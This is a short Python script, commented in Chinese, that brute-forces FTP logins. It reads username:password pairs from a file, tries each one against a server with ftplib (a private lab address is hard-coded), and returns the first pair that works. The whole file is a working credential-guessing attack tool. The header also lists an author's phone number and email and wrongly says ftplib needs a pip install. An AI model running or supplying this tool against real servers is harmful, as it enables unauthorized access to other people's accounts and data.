# -*- coding:utf-8 -*-
# /usr/bin/python
'''
-------------------------------------------------
   File Name   :  ftp_brute_login
   Description :  暴力破解ftp，获得登陆许可
   Envs        :  python == 3.55
                  pip install ftplib
   Date        :  2021/3/2  下午1:52
   CodeStyle   :  规范,简洁,易懂,可阅读,可维护,可移植!
-------------------------------------------------
   Change Activity:
          2021/3/2 : build
-------------------------------------------------
__Author__ = "Yan Errol 13075851954"
__Email__ = "260187357@qq.com"
__Copyright__ = "Copyright 2021, Yan Errol"
-------------------------------------------------
'''

import ftplib
import time

def brute_login(hostname, passwd_file):
    with open(passwd_file) as file:
        ftp = ftplib.FTP(hostname)
        for line in file.readlines():
            time.sleep(1)
            username = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')
            print('[+] Trying: {}/{}'.format(username,password))
            try:
                ftp.login(username, password)
                print('\n[*] {} FTP Logon Succeeded: {}/{}'.format(str(hostname),username,password))
                ftp.quit()
                return username, password
            except Exception as e:
                print('[-] Exception: {}'.format(e))
                pass
        print('\n[-] Could not brute force FTP credentials.')
        return None, None

if __name__ == "__main__":
    tgt_host = '192.168.95.179'
    pass_file = 'userpass.txt'
    brute_login(tgt_host, pass_file)

